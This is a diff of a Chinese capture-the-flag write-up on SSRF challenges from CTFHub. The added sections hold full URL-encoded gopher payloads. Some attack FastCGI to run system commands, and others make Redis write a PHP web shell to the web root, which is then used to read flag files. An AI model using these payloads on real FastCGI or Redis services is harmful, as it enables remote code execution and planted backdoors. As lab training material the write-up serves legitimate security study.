@@ -15,7 +15,7 @@ tag:
 
 comment: false
 ---
-
+![ssrf](/assets/img/ctf/ssrf.png)
 ## 内网访问
   直接构造访问请求,获取flag
   ```url
@@ -30,7 +30,7 @@ comment: false
   /?url=127.0.0.1:8000
   ```
   使用burpsuite对端口进行爆破，即可得到端口，访问获取flag
-## POST请求
+## POST请求  
   访问/?url=127.0.0.1/flag.ph,返回页面  
   ![post1](/assets/img/ctf/post1.png)  
   包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮  
@@ -93,14 +93,43 @@ POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%
 ## FastCGI协议
 [fastcgi相关介绍](https://blog.csdn.net/mysteryflower/article/details/94386461)  
 [gopher payload工具](https://github.com/tarunkant/Gopherus)  
-使用gopher工具生成payload，运行命令`ls /`  
-![fastcgi1](/assets/img/ctf/fastcgi1.png)  
+使用gopherus工具生成payload，运行命令`ls /`  
+![fastcgi1](/assets/img/ctf/fastcgi1.png)   
+进行url编码后得到提交payload  
+```url
+gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520%2F%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+```
 发送请求，获取`/`下目录情况,发现flag文件  
 ![fastcgi2](/assets/img/ctf/fastcgi2.png)    
-使用gopher工具生成payload，运行命令`cat /flag_14e0ba551d369f7992793e0b62395dc5`  
-![fastcgi3](/assets/img/ctf/fastcgi3.png)  
+使用gopherus工具生成payload，运行命令`cat /flag_14e0ba551d369f7992793e0b62395dc5`   
+![fastcgi3](/assets/img/ctf/fastcgi3.png)   
+进行url编码后得到提交payload    
+```url
+gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_14e0ba551d369f7992793e0b62395dc5%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+```  
 发送请求，获得flag  
 ![fastcgi4](/assets/img/ctf/fastcgi4.png)
+
+## Redis协议
+[浅析Redis中SSRF的利用](https://xz.aliyun.com/t/5665)  
+redis写shell命令如下
+```shell
+flushall
+set 1 '<?php eval($_GET["feng"]);?>'
+config set dir /var/www/html
+config set dbfilename feng.php
+save
+```
+使用gopherus工具生成redis攻击payload  
+![redis1](/assets/img/ctf/redis1.png)  
+进行url编码得到请求payload
+```
+gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
+```
+请求后生成一句话shell.php文件，利用参数cmd，构造请求`/shell.php?cmd=ls%20/`  
+![redis2](/assets/img/ctf/redis2.png)  
+获取flag文件，再构造请求`/shell.php?cmd=cat%20/flag_1d41ab57dcc1507d5d99e103cdca52da`,获得flag  
+![redis3](/assets/img/ctf/redis3.png)  
 ## URL Bypasss
   访问地址提示"start with `http://notfound.ctfhub.com`", 所以需要以`http://notfound.ctfhub.com`开头，构造访问url如下获取flag
   ```url
@@ -122,3 +151,10 @@ POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%
 ## 302跳转 Bypass
 题目提示过滤了127.0.0.1，使用[数字IP Bypass](#数字ip-bypass)可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  [短链接生成网站](https://my5353.com/)  
 ![短链接访问](/assets/img/ctf/302.png)
+## DNS重绑定
+[DNS重绑定漏洞](https://zhuanlan.zhihu.com/p/89426041)  
+使用file://协议查看flag.php查看代码发现过滤了`/127|172|10|192/`开头，可以用16进制方式绕过，但是考虑到题目要求使用DNS重绑定  
+使用[rbndr.us dns rebinding service](https://lock.cmpxchg8b.com/rebinder.html)获取域名  
+![dns1](/assets/img/ctf/dns1.png)  
+访问或取flag  
+![dns2](/assets/img/ctf/dns2.png)
